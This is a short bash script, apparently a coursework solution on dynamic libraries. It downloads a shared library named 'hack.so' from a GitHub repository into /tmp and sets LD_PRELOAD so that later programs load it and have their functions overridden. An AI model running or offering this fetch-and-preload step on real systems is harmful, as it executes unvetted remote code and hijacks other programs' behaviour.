#!/bin/bash
wget -O /tmp/hack.so https://github.com/xlr8tor/alx-low_level_programming/raw/master/0x17-dynamic_libraries/hack.so
export LD_PRELOAD=/tmp/hack.so
